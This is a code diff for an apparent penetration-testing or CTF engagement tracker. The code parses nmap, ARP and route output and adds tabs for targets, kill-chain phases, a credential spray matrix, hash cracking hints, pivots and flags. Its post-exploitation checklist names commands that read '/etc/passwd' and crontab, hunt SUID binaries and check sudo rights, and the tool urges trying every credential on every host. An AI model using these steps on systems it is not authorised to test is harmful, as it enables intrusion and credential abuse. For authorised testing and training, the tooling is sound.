+    <div style="font-size:11px;color:#94a3b8;margin-bottom:12px">${esc(a.label||a.ip)} <span class="arrow">→</span> ${esc(b.label||b.ip)}</div>
+    <div class="map-modal-row"><label>LABEL</label><input class="fi" id="em_label" placeholder="ms17_010, SSH creds, portfwd…"></div>
+    <div class="map-modal-row"><label>METHOD</label><select class="fi" id="em_method"><option value="">—</option><option value="autoroute">autoroute</option><option value="portfwd">portfwd</option><option value="exploit">exploit</option><option value="creds">credentials</option><option value="lateral">lateral move</option></select></div>
+    <div class="map-modal-actions"><button class="btn btn-danger" onclick="closeModal()">Cancel</button><button class="btn" onclick="saveEdgeModal('${fromId}','${toId}')">Add</button></div>
+  </div></div>`;
+}
+function saveEdgeModal(fromId,toId){
+  const label=document.getElementById("em_label").value.trim();const method=document.getElementById("em_method").value;
+  S.mapEdges.push({id:uid(),from:fromId,to:toId,label:label||method||"",method,selected:false});save();closeModal();drawMap();
+}
+function closeModal(){document.getElementById("mapModal").innerHTML="";}
+
+/* ================================================================ RECON IMPORT ================================================================ */
+function rImport(){
+  return `<div style="margin-bottom:10px;"><div style="font-size:13px;font-weight:700;color:#10b981;letter-spacing:1px;margin-bottom:4px;">RECON IMPORT</div>
+    <div style="font-size:10px;color:#475569;line-height:1.8;">Paste raw tool output → <b style="color:#10b981">PARSE &amp; IMPORT</b> auto-populates Targets + Map + Spray matrix.<br>Existing entries preserved. Duplicate IPs skipped. Existing targets enriched with new ports.</div></div>
+  <div class="imp-grid">
+    <div><div style="font-size:11px;font-weight:700;color:#3b82f6;margin-bottom:5px;">📡 NMAP OUTPUT</div>
+      <div style="font-size:10px;color:#475569;margin-bottom:4px;">nmap -sV / -A / -sC / db_nmap</div>
+      <textarea id="imp_nmap" class="fi" style="width:100%;min-height:280px;font-size:11px;line-height:1.5;" placeholder="Paste nmap output…
+
+Nmap scan report for 10.10.10.5
+22/tcp open  ssh  OpenSSH 7.9
+80/tcp open  http Apache 2.4.38
+445/tcp open  microsoft-ds
+OS details: Linux 4.x"></textarea></div>
+    <div><div style="font-size:11px;font-weight:700;color:#f59e0b;margin-bottom:5px;">🔗 ARP OUTPUT</div>
+      <div style="font-size:10px;color:#475569;margin-bottom:4px;">arp -a / ip neigh / arp-scan</div>
+      <textarea id="imp_arp" class="fi" style="width:100%;min-height:280px;font-size:11px;line-height:1.5;" placeholder="Paste arp -a output…
+
+? (10.10.10.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
+? (10.10.10.5) at 11:22:33:44:55:66 [ether] on eth0"></textarea></div>
+    <div><div style="font-size:11px;font-weight:700;color:#a855f7;margin-bottom:5px;">🗺 ROUTE TABLE</div>
+      <div style="font-size:10px;color:#475569;margin-bottom:4px;">ip route / route -n / netstat -rn</div>
+      <textarea id="imp_route" class="fi" style="width:100%;min-height:280px;font-size:11px;line-height:1.5;" placeholder="Paste ip route output…
+
+10.10.10.0/24 dev eth0
+192.168.2.0/24 dev eth1
+
+--- route -n ---
+10.10.10.0  0.0.0.0  255.255.255.0  eth0"></textarea></div>
+  </div>
+  <div style="display:flex;gap:8px;align-items:center;margin-bottom:14px;">
+    <button class="btn" style="font-size:12px;padding:7px 18px;" onclick="parseRecon()">⬇ PARSE &amp; IMPORT</button>
+    <button class="btn btn-danger" onclick="clearImport()">CLEAR FIELDS</button>
+    <span id="imp_status" style="font-size:11px;color:#10b981;font-weight:600;"></span>
+  </div>
+  <div id="imp_preview" style="display:none;">
+    <div style="font-size:11px;font-weight:700;color:#94a3b8;letter-spacing:0.5px;margin-bottom:8px;border-top:1px solid #1e293b;padding-top:10px;">PARSE PREVIEW</div>
+    <div id="imp_preview_body"></div>
+  </div>`;
+}
+function clearImport(){['imp_nmap','imp_arp','imp_route'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});const s=document.getElementById('imp_status');if(s)s.textContent='';const p=document.getElementById('imp_preview');if(p)p.style.display='none';}
+function parseRecon(){
+  const nmapRaw=(document.getElementById('imp_nmap')||{value:''}).value;
+  const arpRaw=(document.getElementById('imp_arp')||{value:''}).value;
+  const routeRaw=(document.getElementById('imp_route')||{value:''}).value;
+  const nmapHosts=parseNmap(nmapRaw);const arpHosts=parseArp(arpRaw);const routeSubnets=parseRoute(routeRaw);
+  const allHosts=mergeHosts(nmapHosts,arpHosts);
+  const existIPs=new Set(S.targets.map(t=>t.ip));const existMapIPs=new Set(S.mapNodes.map(n=>n.ip));
+  let tAdded=0,nAdded=0,skipped=0;
+  allHosts.forEach(h=>{
+    if(!h.ip)return;const subnet=routeSubnets.find(s=>ipInSubnet(h.ip,s))||guessCIDR(h.ip);
+    if(!existIPs.has(h.ip)){S.targets.push({id:uid(),ip:h.ip,hostname:h.hostname||'',os:h.os||'',status:'Enumerated',checks:{},timerStart:null,killChain:{},kcNotes:"",ports:h.ports.length?h.ports:[{port:'',service:'',version:'',notes:''}]});existIPs.add(h.ip);tAdded++;}
+    else{const ex=S.targets.find(t=>t.ip===h.ip);if(ex&&h.ports.length){const ep=new Set(ex.ports.map(p=>p.port));h.ports.forEach(p=>{if(p.port&&!ep.has(p.port)){ex.ports.push(p);ep.add(p.port);}});if(h.os&&!ex.os)ex.os=h.os;if(h.hostname&&!ex.hostname)ex.hostname=h.hostname;}skipped++;}
+    if(!existMapIPs.has(h.ip)){S.mapNodes.push({id:uid(),label:h.hostname||h.ip,ip:h.ip,subnet:subnet||'',os:h.os||'',status:'Enumerated',x:200+S.mapNodes.filter(n=>n.status!=='Kali').length%4*180,y:60+Math.floor(S.mapNodes.filter(n=>n.status!=='Kali').length/4)*120,selected:false});existMapIPs.add(h.ip);nAdded++;}
+  });
+  save();stats();tabs();
+  let prev='';
+  if(allHosts.length===0&&routeSubnets.length===0){
+    const hadNmap=(document.getElementById('imp_nmap')||{value:''}).value.trim().length>20;
+    const hadArp=(document.getElementById('imp_arp')||{value:''}).value.trim().length>10;
+    let warn='⚠ Nothing parsed.';
+    if(hadNmap)warn+='\n\nNmap field had content but 0 hosts were extracted. Check format:\n• Standard: needs "Nmap scan report for" lines\n• Grepable (-oG): needs "Host: IP" lines\n• XML format is not supported — use -oN or terminal output';
+    if(hadArp)warn+='\n\nARP field had content but 0 hosts extracted. Expected format: "? (IP) at MAC" or "IP dev ethX lladdr MAC"';
+    prev=`<div style="color:#ef4444;font-size:11px;line-height:1.6;white-space:pre-wrap">${esc(warn)}</div>`;
+  }
+  else{
+    if(routeSubnets.length){prev+=`<div style="margin-bottom:8px;font-size:11px;color:#a855f7;font-weight:700;">SUBNETS (${routeSubnets.length})</div><div style="margin-bottom:12px;">${routeSubnets.map(s=>`<span style="display:inline-block;background:#a855f718;border:1px solid #a855f744;border-radius:3px;padding:2px 8px;margin:2px;font-size:11px;color:#a855f7">${esc(s)}</span>`).join('')}</div>`;}
+    if(allHosts.length){
+      prev+=`<div style="margin-bottom:8px;font-size:11px;color:#10b981;font-weight:700;">${allHosts.length} HOSTS — ${tAdded} added · ${nAdded} map nodes · ${skipped} enriched</div><div style="display:flex;flex-direction:column;gap:6px;">`;
+      allHosts.forEach(h=>{
+        prev+=`<div style="border:1px solid #1e293b;border-radius:4px;padding:8px 10px;background:#111827;"><div style="display:flex;gap:8px;align-items:center;margin-bottom:${h.ports.length?'6px':'0'}"><span style="color:#10b981;font-weight:700;font-size:12px">${esc(h.ip)}</span>${h.hostname?`<span style="color:#94a3b8;font-size:11px">${esc(h.hostname)}</span>`:''} ${h.os?`<span style="background:#1e293b;color:#f59e0b;font-size:10px;padding:1px 6px;border-radius:3px">${esc(h.os)}</span>`:''}</div>${h.ports.length?`<div style="display:flex;flex-wrap:wrap;gap:4px;">${h.ports.map(p=>{const tag=SVC_TAGS[parseInt(p.port)];return `<span style="background:#1a2332;border:1px solid ${tag?tag.c+'44':'#1e293b'};color:${tag?tag.c:'#3b82f6'};font-size:10px;padding:1px 6px;border-radius:3px">${esc(p.port)} ${esc(p.service)}</span>`;}).join('')}</div>`:''}</div>`;
+      });prev+='</div>';
+    }
+  }
+  const pEl=document.getElementById('imp_preview');const pbEl=document.getElementById('imp_preview_body');
+  if(pEl&&pbEl){pEl.style.display='block';pbEl.innerHTML=prev;}
+  const st=document.getElementById('imp_status');if(st)st.textContent=`✓ ${tAdded} targets · ${nAdded} map nodes · ${skipped} enriched`;
+  // Auto-fit map view if new nodes were added so they're not off-screen
+  if(nAdded>0&&mapCtx){setTimeout(()=>{if(AT==="map")mapFitAll();},100);}
+}
+function parseNmap(raw){
+  if(!raw.trim())return [];
+  // Detect grepable format: lines starting with "Host:"
+  const lines=raw.split('\n');
+  const hasGrep=lines.some(l=>/^Host:\s+\d{1,3}(\.\d{1,3}){3}/.test(l.trim()));
+  if(hasGrep) return parseNmapGrep(raw);
+  // Standard nmap output
+  const hosts=[];let cur=null;
+  lines.forEach(line=>{
+    const hm=line.match(/Nmap scan report for ([^\s(]+)(?:\s+\(([^)]+)\))?/);
+    if(hm){if(cur)hosts.push(cur);const a=hm[1],b=hm[2];const isIP=s=>/^\d{1,3}(\.\d{1,3}){3}$/.test(s);cur={ip:b?b:isIP(a)?a:'',hostname:b?a:isIP(a)?'':a,os:'',ports:[],mac:''};return;}
+    if(!cur)return;
+    const mm=line.match(/MAC Address:\s+([0-9A-Fa-f:]{17})/);if(mm){cur.mac=mm[1];return;}
+    const om=line.match(/OS details:\s+(.+)/)||line.match(/Running:\s+(.+)/);
+    if(om&&!cur.os){const r=om[1].trim();if(/windows/i.test(r))cur.os='Windows';else if(/linux|ubuntu|debian|centos|fedora/i.test(r))cur.os='Linux';}
+    const pm=line.match(/^(\d+)\/(tcp|udp)\s+(open)\s+(\S+)(?:\s+(.+))?/);
+    if(pm)cur.ports.push({port:pm[1],proto:pm[2],service:pm[4]||'',version:(pm[5]||'').trim().slice(0,50),notes:''});
+  });
+  if(cur)hosts.push(cur);return hosts;
+}
+// Parse nmap grepable output (-oG)
+// Format: Host: 10.10.10.5 (hostname)\tPorts: 22/open/tcp//ssh//OpenSSH 7.9/, 80/open/tcp//http//Apache/\tOS: Linux
+function parseNmapGrep(raw){
+  const hosts=[];const seen=new Set();
+  raw.split('\n').forEach(line=>{
+    if(!line.startsWith('Host:'))return;
+    const ipMatch=line.match(/^Host:\s+(\d{1,3}(?:\.\d{1,3}){3})(?:\s+\(([^)]*)\))?/);
+    if(!ipMatch)return;
+    const ip=ipMatch[1];if(seen.has(ip))return;seen.add(ip);
+    const hostname=(ipMatch[2]&&ipMatch[2]!==ip)?ipMatch[2]:'';
+    const h={ip,hostname,os:'',ports:[],mac:''};
+    // Parse ports section: Ports: 22/open/tcp//ssh//OpenSSH 7.9/, 80/open/tcp//http//Apache/
+    const portsMatch=line.match(/Ports:\s+(.+?)(?:\t|$)/);
+    if(portsMatch){
+      portsMatch[1].split(',').forEach(chunk=>{
+        chunk=chunk.trim();if(!chunk)return;
+        const parts=chunk.split('/');
+        // Format: port/state/protocol/owner/service/rpc_info/version
+        if(parts.length>=5&&parts[1]==='open'){
+          h.ports.push({port:parts[0],proto:parts[2]||'tcp',service:parts[4]||'',version:(parts[6]||'').trim().slice(0,50),notes:''});
+        }
+      });
+    }
+    // Parse OS
+    const osMatch=line.match(/OS:\s+(.+?)(?:\t|$)/);
+    if(osMatch){const os=osMatch[1].trim();if(/windows/i.test(os))h.os='Windows';else if(/linux|ubuntu|debian|centos/i.test(os))h.os='Linux';}
+    hosts.push(h);
+  });
+  return hosts;
+}
+function parseArp(raw){
+  if(!raw.trim())return [];const hosts=[];const seen=new Set();
+  raw.split('\n').forEach(line=>{
+    const m1=line.match(/([^\s(]*)\s*\((\d{1,3}(?:\.\d{1,3}){3})\)\s+at\s+([0-9A-Fa-f:]{17})?/);
+    if(m1){const ip=m1[2];if(ip&&!seen.has(ip)){seen.add(ip);hosts.push({ip,hostname:(m1[1]&&m1[1]!=='?')?m1[1]:'',mac:m1[3]||'',os:'',ports:[]});}return;}
+    const m2=line.match(/^(\d{1,3}(?:\.\d{1,3}){3})\s+dev\s+\S+\s+lladdr\s+([0-9A-Fa-f:]{17})/);
+    if(m2){const ip=m2[1];if(!seen.has(ip)){seen.add(ip);hosts.push({ip,hostname:'',mac:m2[2]||'',os:'',ports:[]});}}
+    const m3=line.match(/^(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9A-Fa-f:]{17})/);
+    if(m3){const ip=m3[1];if(!seen.has(ip)){seen.add(ip);hosts.push({ip,hostname:'',mac:m3[2],os:'',ports:[]});}}
+  });return hosts;
+}
+function parseRoute(raw){
+  if(!raw.trim())return [];const subnets=new Set();
+  raw.split('\n').forEach(line=>{
+    const m1=line.match(/^(\d{1,3}(?:\.\d{1,3}){3}\/\d{1,2})/);if(m1&&!line.startsWith('default'))subnets.add(m1[1]);
+    const m2=line.match(/^(\d{1,3}(?:\.\d{1,3}){3})\s+\S+\s+(255\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+    if(m2){const c=maskToCIDR(m2[2]);if(c!==null)subnets.add(m2[1]+'/'+c);}
+  });return[...subnets].filter(s=>!s.startsWith('0.0.0.0'));
+}
+function maskToCIDR(mask){return mask.split('.').reduce((a,b)=>{let n=parseInt(b),c=0;while(n){c+=(n&1);n>>=1;}return a+c;},0)||null;}
+function ipInSubnet(ip,cidr){try{const[net,bits]=cidr.split('/');const mask=(0xFFFFFFFF<<(32-parseInt(bits)))>>>0;const ipInt=ip.split('.').reduce((a,b)=>(a<<8)|parseInt(b),0)>>>0;const netInt=net.split('.').reduce((a,b)=>(a<<8)|parseInt(b),0)>>>0;return(ipInt&mask)===(netInt&mask);}catch(e){return false;}}
+function guessCIDR(ip){const f=parseInt(ip.split('.')[0]);if(f===10)return ip.split('.').slice(0,3).join('.')+'.0/24';if(f===172)return ip.split('.').slice(0,2).join('.')+'.0.0/16';if(f===192)return ip.split('.').slice(0,3).join('.')+'.0/24';return '';}
+function mergeHosts(nmap,arp){const byIP={};nmap.forEach(h=>{if(h.ip)byIP[h.ip]=h;});arp.forEach(h=>{if(!h.ip)return;if(byIP[h.ip]){if(!byIP[h.ip].mac&&h.mac)byIP[h.ip].mac=h.mac;if(!byIP[h.ip].hostname&&h.hostname)byIP[h.ip].hostname=h.hostname;}else byIP[h.ip]=h;});return Object.values(byIP);}
+
+/* ================================================================ TARGETS ================================================================ */
+function rTargets(){
+  let h="";
+  S.targets.forEach((t,i)=>{
+    const locked=t.status==="Owned";
+    const hit=searchTerm&&matchesSearch([t.ip,t.hostname,t.os,...t.ports.map(p=>p.port+" "+p.service+" "+p.notes)]);
+    let timerHTML="";
+    if(t.status==="In Progress"&&t.timerStart){const mins=Math.floor((Date.now()-t.timerStart)/60000);timerHTML=`<span class="tgt-timer ${mins>30?"stale":""}" title="${mins} minutes on this target">⏱ ${elapsedStr(t.timerStart)}</span>`;}
+    let ph="";
+    t.ports.forEach((p,pi)=>{
+      const hint=PH[parseInt(p.port)];const tag=svcTag(p.port);
+      ph+=`<div class="card-row">${fiChange(p.port,"Port","55px",v=>{S.targets[i].ports[pi].port=v})} ${fi(p.service,"Service","85px",v=>{S.targets[i].ports[pi].service=v})} ${fi(p.version,"Version","110px",v=>{S.targets[i].ports[pi].version=v})} ${fi(p.notes,"Notes","130px",v=>{S.targets[i].ports[pi].notes=v})} ${rb(()=>{S.targets[i].ports.splice(pi,1)})} ${tag} ${hint?`<span class="port-hint">${hint}</span>`:""}</div>`;
+    });
+    const checks=relevantChecks(t);let clHTML='';
+    checks.forEach(c=>{const cid="ck_"+uid();const checked=(t.checks&&t.checks[c.k])?'checked':'';reg(cid,"change",e=>{S.targets[i].checks[c.k]=e.target.checked;save();});clHTML+=`<div class="tgt-check-item"><input type="checkbox" id="${cid}" ${checked}><label for="${cid}">${c.l}</label></div>`;});
+    // Kill chain (Feature 2)
+    if(!t.killChain)t.killChain={};
+    let kcHTML=`<div class="kc-wrap"><div class="kc-title">KILL CHAIN</div><div class="kc-phases">`;
+    KC_PHASES.forEach(phase=>{const st=t.killChain[phase]||"pending";kcHTML+=`<div class="kc-phase kc-${st}" onclick="cycleKC(${i},'${phase}')">${phase}</div>`;});
+    kcHTML+=`</div>`;
+    const kcNid="kn_"+uid();reg(kcNid,"input",e=>{S.targets[i].kcNotes=e.target.value;save();});
+    kcHTML+=`<div style="margin-top:4px"><input id="${kcNid}" class="fi" type="text" placeholder="Attack notes…" value="${esc(t.kcNotes||"")}" style="width:100%;font-size:10px;padding:4px 6px;"></div></div>`;
+    h+=`<div class="card ${locked?"locked":""} ${hit?"search-hit":""}">
+      <div class="card-row">
+        ${fi(t.ip,"IP Address","130px",v=>{S.targets[i].ip=v})}
+        ${fi(t.hostname,"Hostname","130px",v=>{S.targets[i].hostname=v})}
+        ${sl(t.os,[{v:"",l:"OS?"},{v:"Linux",l:"Linux"},{v:"Windows",l:"Windows"},{v:"Unknown",l:"Unknown"}],v=>{S.targets[i].os=v})}
+        ${sl(t.status,[{v:"Enumerated",l:"Enumerated"},{v:"In Progress",l:"In Progress"},{v:"Owned",l:"Owned"}],v=>{if(v==="In Progress"&&!S.targets[i].timerStart)S.targets[i].timerStart=Date.now();if(v!=="In Progress")S.targets[i].timerStart=null;S.targets[i].status=v;},v=>v==="Owned"?"#10b981":v==="In Progress"?"#f59e0b":"#94a3b8")}
+        ${locked?'<span class="flag-lock-badge">✓ OWNED</span>':''}
+        ${rb(()=>{S.targets.splice(i,1)},"target",i,t.ip||"target")}
+        ${timerHTML}
+      </div>
+      <div class="port-label">PORTS / SERVICES</div>
+      ${ph}
+      ${ab("+ Port",()=>{S.targets[i].ports.push({port:"",service:"",version:"",notes:""})})}
+      <div class="tgt-checklist"><div class="tgt-checklist-title">ENUM CHECKLIST</div><div class="tgt-checks">${clHTML}</div></div>
+      ${kcHTML}
+    </div>`;
+  });
+  h+=ab("+ Add Target",()=>{S.targets.push({id:uid(),ip:"",hostname:"",os:"",status:"Enumerated",checks:{},timerStart:null,killChain:{},kcNotes:"",ports:[{port:"",service:"",version:"",notes:""}]})});
+  return h;
+}
+function cycleKC(tIdx,phase){if(!S.targets[tIdx].killChain)S.targets[tIdx].killChain={};const cur=S.targets[tIdx].killChain[phase]||"pending";S.targets[tIdx].killChain[phase]=cur==="pending"?"active":cur==="active"?"done":"pending";save();render();}
+
+/* ================================================================ SPRAY MATRIX ================================================================ */
+function sprayKey(cid,ip){return `${cid}__${ip}`;}
+function sprayVal(cid,ip){return S.sprayMatrix[sprayKey(cid,ip)]||"untried";}
+function setSpray(cid,ip,val){
+  S.sprayMatrix[sprayKey(cid,ip)]=val;save();
+  // Feature 4: auto-sync worksOn in cred — add on works, remove on fail/untried
+  const c=S.credentials.find(cr=>cr.id===cid);
+  if(c){
+    const ex=(c.worksOn||"").split(",").map(s=>s.trim()).filter(Boolean);
+    if(val==="works"&&!ex.includes(ip)){ex.push(ip);c.worksOn=ex.join(", ");save();}
+    else if(val!=="works"&&ex.includes(ip)){c.worksOn=ex.filter(x=>x!==ip).join(", ");save();}
+  }
+  const cellId=`sp_${cid}_${ip.replace(/\./g,'_')}`;const cell=document.getElementById(cellId);
+  if(cell)cell.innerHTML=sprayCellHTML(cid,ip);
+  // update coverage row
+  const covId=`cov_${ip.replace(/\./g,'_')}`;const covEl=document.getElementById(covId);
+  if(covEl){const creds=S.credentials.filter(c=>c.username||c.password||c.hash);const total=creds.length;const tried=creds.filter(c=>sprayVal(c.id,ip)!=="untried").length;const works=creds.filter(c=>sprayVal(c.id,ip)==="works").length;const pct=total?Math.round(tried/total*100):0;const col=works>0?"#10b981":pct===100?"#3b82f6":pct>50?"#f59e0b":"#ef4444";covEl.innerHTML=`<span style="color:${col};font-weight:700">${tried}/${total}</span>${works>0?` <span style="color:#10b981">✓${works}</span>`:'`'}`;}
+}
+function sprayCellHTML(cid,ip){
+  const v=sprayVal(cid,ip);
+  return [{k:"untried",l:"?",cls:"s-untried"},{k:"works",l:"✓",cls:"s-works"},{k:"fail",l:"✗",cls:"s-fail"}]
+    .map(s=>`<button class="spray-btn ${s.cls}" data-cid="${cid}" data-ip="${ip}" data-val="${s.k}" style="opacity:${v===s.k?1:0.3}">${s.l}</button>`).join('');
+}
+function rSpray(){
+  const creds=S.credentials.filter(c=>c.username||c.password||c.hash);
+  const targets=S.targets.filter(t=>t.ip);
+  if(!creds.length||!targets.length)return `<div style="color:#475569;font-size:11px;padding:20px 0;">${!creds.length?"Add credentials in CREDS tab first.":"Add targets in TARGETS tab first."}<br><br><span style="color:#f59e0b">⚠ Password reuse is the #1 lateral movement vector. Every cred on every target.</span></div>`;
+  let h=`<div style="margin-bottom:10px;"><div style="font-size:13px;font-weight:700;color:#a855f7;letter-spacing:1px;margin-bottom:4px;">CREDENTIAL SPRAY MATRIX</div><div style="font-size:10px;color:#475569;line-height:1.8;">✓ = works &nbsp;·&nbsp; ✗ = fail &nbsp;·&nbsp; ? = untried &nbsp;·&nbsp; <span style="color:#f59e0b">Leave no cell untried.</span></div></div>`;
+  h+=`<div style="overflow-x:auto;"><table class="spray-table"><thead><tr><th style="min-width:180px">CREDENTIAL</th>`;
+  targets.forEach(t=>{h+=`<th style="min-width:110px;text-align:center">${esc(t.ip)}<br><span style="color:#475569;font-weight:400;font-size:9px">${esc(t.hostname||t.os||'')}</span></th>`;});
+  h+=`</tr></thead><tbody id="sprayBody">`;
+  creds.forEach(c=>{
+    h+=`<tr><td><div style="font-size:11px;color:#e2e8f0;font-weight:600">${esc(c.username||'?')}</div>${c.password?`<div style="font-size:10px;color:#64748b">${esc(c.password)}</div>`:''} ${c.hash?`<div style="font-size:9px;color:#a855f7">[hash]</div>`:''} ${c.source?`<div style="font-size:9px;color:#334155">from: ${esc(c.source)}</div>`:''}</td>`;
+    targets.forEach(t=>{h+=`<td><div class="spray-cell" id="sp_${c.id}_${t.ip.replace(/\./g,'_')}">${sprayCellHTML(c.id,t.ip)}</div></td>`;});
+    h+=`</tr>`;
+  });
+  h+=`<tr style="background:#0c1322"><td style="font-size:10px;color:#64748b;font-weight:700">COVERAGE</td>`;
+  targets.forEach(t=>{
+    const total=creds.length;const tried=creds.filter(c=>sprayVal(c.id,t.ip)!=="untried").length;const works=creds.filter(c=>sprayVal(c.id,t.ip)==="works").length;
+    const pct=total?Math.round(tried/total*100):0;const col=works>0?"#10b981":pct===100?"#3b82f6":pct>50?"#f59e0b":"#ef4444";
+    h+=`<td style="text-align:center;font-size:10px;" id="cov_${t.ip.replace(/\./g,'_')}"><span style="color:${col};font-weight:700">${tried}/${total}</span>${works>0?` <span style="color:#10b981">✓${works}</span>`:''}</td>`;
+  });
+  h+=`</tr></tbody></table></div>`;
+  // Register single delegated click handler on tbody
+  reg("sprayBody","click",e=>{
+    const btn=e.target.closest(".spray-btn");if(!btn)return;
+    const cid=btn.dataset.cid,ip=btn.dataset.ip,val=btn.dataset.val;
+    if(cid&&ip&&val)setSpray(cid,ip,val);
+  });
+  return h;
+}
+
+/* ================================================================ CREDS ================================================================ */
+function rCreds(){
+  let h="";
+  S.credentials.forEach((c,i)=>{
+    const hi=detectHash(c.hash);
+    const hit=searchTerm&&matchesSearch([c.username,c.password,c.hash,c.source,c.worksOn]);
+    const hBadge=hi?`<span class="hash-badge" style="background:${hi.c}22;color:${hi.c};border:1px solid ${hi.c}44">${hi.l}</span>`:'';
+    const hCmd=hi?`<code style="font-size:10px;color:#475569;background:#1a2332;padding:2px 6px;border-radius:3px">hashcat -m ${hi.m}</code>`:'';
+    h+=`<div class="card ${hit?"search-hit":""}">
+      <div class="card-row">${fi(c.username,"Username","130px",v=>{S.credentials[i].username=v})} ${fi(c.password,"Password","140px",v=>{S.credentials[i].password=v})} ${rb(()=>{S.credentials.splice(i,1)},"credential",i,c.username||"cred")}</div>
+      <div class="card-row">${fiChange(c.hash,"Hash","220px",v=>{S.credentials[i].hash=v})} ${hBadge} ${hCmd}</div>
+      <div class="card-row">${fi(c.source,"Source (where found)","180px",v=>{S.credentials[i].source=v})} ${fi(c.worksOn,"Works on (IPs/services)","200px",v=>{S.credentials[i].worksOn=v})}</div>
+    </div>`;
+  });
+  h+=ab("+ Add Credential",()=>{S.credentials.push({id:uid(),username:"",password:"",hash:"",source:"",worksOn:""})});
+  if(S.credentials.length>0)h+=`<div class="warn-box">Use SPRAY tab to track every cred on every target. ✓ auto-populates "Works on" field. Password reuse = #1 lateral movement vector.</div>`;
+  return h;
+}
+
+/* ================================================================ FLAGS ================================================================ */
+function rFlags(){
+  let h="";
+  S.flags.forEach((f,i)=>{
+    const locked=!!(f.answer&&f.confidence==="High");
+    const hit=searchTerm&&matchesSearch([f.question,f.answer]);
+    h+=`<div class="card ${locked?"locked":""} ${hit?"search-hit":""}"><div class="card-row">
+      <span style="color:#64748b;font-size:11px;font-weight:700;width:24px">Q${i+1}</span>
+      ${fi(f.question,"Question / Task","240px",v=>{S.flags[i].question=v})}
+      ${fiChange(f.answer,"Answer / Flag","200px",v=>{S.flags[i].answer=v})}
+      ${sl(f.confidence,[{v:"High",l:"HIGH"},{v:"Medium",l:"MED"},{v:"Low",l:"LOW"}],v=>{S.flags[i].confidence=v},v=>v==="High"?"#10b981":v==="Medium"?"#f59e0b":"#ef4444")}
+      ${locked?'<span class="flag-lock-badge">CONFIRMED</span>':''}
+      ${rb(()=>{S.flags.splice(i,1)},"flag",i,"Q"+(i+1))}
+    </div></div>`;
+  });
+  h+=ab("+ Add Flag",()=>{S.flags.push({id:uid(),question:"",answer:"",confidence:"High"})});
+  return h;
+}
+
+/* ================================================================ PIVOTS ================================================================ */
+function rPivots(){
+  let h=`<div class="pivot-pulse"><div class="pivot-pulse-dot"></div>
+    <div><b>SESSION HEALTH CHECK BEFORE EVERY PIVOT ACTION</b><br>
+    <span style="font-size:10px">(1) <code>sessions -l</code> — session alive? &nbsp;|&nbsp; (2) MSF module or external tool? &nbsp;|&nbsp; (3) External → portfwd → <code>127.0.0.1:PORT</code> not the internal IP</span></div>
+  </div>`;
+  S.pivots.forEach((p,i)=>{
+    const hint=PVH[p.method]||"";
+    const hit=searchTerm&&matchesSearch([p.from,p.subnet,p.session,p.method]);
+    h+=`<div class="card ${hit?"search-hit":""}"><div class="card-row">
+      ${fi(p.from,"From IP","120px",v=>{S.pivots[i].from=v})} <span class="arrow">→</span>
+      ${fi(p.subnet,"To Subnet","130px",v=>{S.pivots[i].subnet=v})}
+      ${fi(p.session,"Session #","75px",v=>{S.pivots[i].session=v})}
+      ${sl(p.method,[{v:"",l:"Method?"},{v:"autoroute",l:"autoroute"},{v:"portfwd",l:"portfwd"},{v:"socks_proxy",l:"socks_proxy"}],v=>{S.pivots[i].method=v})}
+      ${sl(p.status,[{v:"Active",l:"ACTIVE"},{v:"Dead",l:"DEAD"}],v=>{S.pivots[i].status=v},v=>v==="Active"?"#10b981":"#ef4444")}
+      ${rb(()=>{S.pivots.splice(i,1)},"pivot",i,p.from||"pivot")}
+    </div>${hint?`<div class="pivot-reminder">${hint}</div>`:""}</div>`;
+  });
+  h+=ab("+ Add Pivot",()=>{S.pivots.push({id:uid(),from:"",to:"",subnet:"",session:"",method:"",status:"Active"})});
+  return h;
+}
+
+/* ================================================================ CMD LOG ================================================================ */
+function rLog(){
+  let h="";
+  S.commands.forEach((c,i)=>{
+    const hit=searchTerm&&matchesSearch([c.target,c.command,c.result]);
+    h+=`<div class="card ${hit?"search-hit":""}"><div class="card-row"><span class="timestamp">${esc(c.timestamp)}</span> ${fi(c.target,"Target IP","120px",v=>{S.commands[i].target=v})} ${rb(()=>{S.commands.splice(i,1)},"command",i,c.command?.slice(0,20)||"cmd")}</div>
+    <div class="card-row">${fi(c.command,"Command","100%",v=>{S.commands[i].command=v})}</div>
+    <div class="card-row">${fi(c.result,"Result / Key Finding","100%",v=>{S.commands[i].result=v})}</div></div>`;
+  });
+  h+=ab("+ Log Command",()=>{S.commands.push({id:uid(),target:"",command:"",result:"",timestamp:new Date().toLocaleTimeString()})});
+  return h;
+}
+
+/* ================================================================ NOTES ================================================================ */
+function rNotes(){const id="n"+uid();reg(id,"input",e=>{S.notes=e.target.value;debounce("notes_save",()=>save(),400);});return `<textarea id="${id}" class="fi" placeholder="Free-form notes — theories, observations, rabbit holes to avoid...">${esc(S.notes)}</textarea>`;}
+
+/* ================================================================ CHECKS ================================================================ */
+function rChecks(){
+  let h=`<div class="section-label">ASK YOURSELF BEFORE EVERY ACTION</div>`;
+  DC.forEach(c=>{h+=`<div class="check-card"><div class="check-trigger">${c.t}</div><div class="check-question">→ ${c.q}</div></div>`;});
+  h+=`<div class="section open" id="sec-linux"><button class="section-header" onclick="tog('sec-linux')"><span class="section-arrow">▼</span> LINUX POST-EX CHECKLIST</button><div class="section-body">
+    <div class="cl"><span class="cn">1.</span> <code>id</code></div><div class="cl"><span class="cn">2.</span> <code>sudo -l</code> → any binary → GTFOBins sudo section</div>
+    <div class="cl"><span class="cn">3.</span> <code>cat /etc/passwd</code></div><div class="cl"><span class="cn">4.</span> <code>ps aux</code></div>
+    <div class="cl"><span class="cn">5.</span> <code>find / -perm -4000 2>/dev/null</code></div><div class="cl"><span class="cn">6.</span> <code>cat /etc/crontab</code></div>
+    <div class="cl"><span class="cn">7.</span> Check other home dirs → password reuse → lateral move</div>
+  </div></div>`;
+  h+=`<div class="section" id="sec-http"><button class="section-header" onclick="tog('sec-http')"><span class="section-arrow">▶</span> HTTP ENUM ORDER (FREE → NOISY)</button><div class="section-body">
+    <div class="cl"><span class="cn">1.</span> Browse manually</div><div class="cl"><span class="cn">2.</span> View page source</div>
+    <div class="cl"><span class="cn">3.</span> <code>/robots.txt</code></div><div class="cl"><span class="cn">4.</span> <code>/sitemap.xml</code></div>
